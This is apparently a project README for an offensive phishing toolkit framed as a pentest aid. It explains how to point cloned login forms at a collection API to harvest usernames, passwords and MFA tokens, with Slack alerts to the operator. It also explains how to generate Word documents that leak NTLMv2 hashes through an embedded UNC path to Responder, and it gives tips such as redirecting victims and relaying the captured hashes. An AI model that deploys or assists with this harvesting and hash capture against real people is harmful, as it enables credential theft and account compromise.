# Phishing-API
This API has two main features.  One allows you to easily deploy cloned landing pages for credential stealing and the other feature is weaponized Word doc creation.  Both are integrated into Slack for real-time alerting.  There's a free service I'm running with a similiar code-base at https://phishapi.com.  


## Update

I've added support for MS Word document generation.  Now, simply go to the API to create your payload, email it off, and wait for the Slack notification.  It automatically includes a UNC path back as well so if you're running Responder in a background session you can capture NTLMv2 hashes and be notified via Slack!  Support for weaponizing your own Word doc templates is built in.  Just upload an existing doc and download it again to hook it.  You can also choose to use Basic Auth which prompts the user for credentials, just like Phishery does!


# To Setup :

1) Import the DB SQL Dump Schema to a new MySQL Instance

2) Host the PHP from a web service (Apache, Nginx, IIS, etc)

3) Configure dbconfig.php and index.php variables

4) Limit Access to the "Results" Directory (Apache's Basic Auth is Recommended)

5) Use SSL and a Domain for the Hosted API (Configure DNS MASKED Forwarding Instead of an A Name Record for Best Results)



# 1) To Use the API for Capturing Credentials from Fake Sites : 

Rapid & Easy Deployment API for Phishing During Pentest Engagements.  Output to MySQL/Web Table &amp; Slack Bot.  Supports BEEF Hooking & HaveIBeenPwned!


1) Point your HTML Form to https://YOUR-API-HERE

	`<FORM METHOD="POST" ACTION="https://YOUR-API-HERE">`

2)  Make sure the following authentication fields are set

	`<INPUT NAME="username">`
	
	`<INPUT NAME="password">`
	
	(OPTIONAL MFA FIELD)  `<INPUT NAME="token">`
	
3) Add hidden input fields for the name of the project and the URL the users should be redirected to after submitting their credentials to you (Recommend Legitimate Login Location - For Best Results Use a Clickjacking Vulnerable URL That Allows iFRAMEs)

	`<INPUT NAME="project" VALUE="My_Project_Here" TYPE="hidden">`
	
	`<INPUT NAME="redirect" VALUE="https://site_to_redirect_to" TYPE="hidden">`
	
4) Optionally include hidden input fields for altering the Slack bot's behavior (Name and Emoji)

	`<INPUT NAME="slackbotname" VALUE="SuckerBot" TYPE="hidden">`
	
	`<INPUT NAME="slackemoji" VALUE=":see_no_evil:" TYPE="hidden">`
	
5) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials


![Notification to Slack Channel](https://i.imgur.com/L8yYRMQ.png)

                  
            
![View Captured Credentials via Web](https://i.imgur.com/2ayiRRW.png)


# 2) To Use the API for Generating Word Doc Payloads :

1) Modify /phishingdocs/index.php to include your Slack Webhook parameters

2) Create /var/www/uploads Path and make sure your web user has sudoers access

3) Browse out to YOUR_URL.com/phishingdocs to generate your DOCX

4) Optionally set up [Responder](https://github.com/SpiderLabs/Responder "Responder") in a background process and run `phishinghashes.sh` every minute or so with cron

5) Set up your php.ini to allow uploads of at least 15MB and enable browsecap.ini for parsing UserAgent strings, otherwise some functionality may be limited.  

6) Email your doc and wait for the Slack alerts!

**Bonus points if you use your docs as honeypot bait! :)**



![Payload Generation](https://i.imgur.com/LW4BUjN.png)

                  
            
	    
![Downloading and Openinig Doc](https://i.imgur.com/Sx1b1Z5.png)




<img src="https://i.imgur.com/sw8JWQE.png" width="40%">

                  

	    
![Phishing Doc Slack Alert](https://i.imgur.com/FXdDm6t.png)




![Phishing Doc Slack Alert 2](https://i.imgur.com/ku6UTNI.png)




![Phishing Doc Results](https://i.imgur.com/JJJWTnZ.png)




![HashBot](https://i.imgur.com/qZFGmXA.png)




Currently, I'm running [Responder](https://github.com/SpiderLabs/Responder "Responder") in a Screen session with `phishinghashes.sh` scheduled via Cron to run every minute to pick up hashes, correlate phished users, and alert via Slack.  You can also relay those hashes with another tool if you'd like to take things even further.  Enjoy! :)
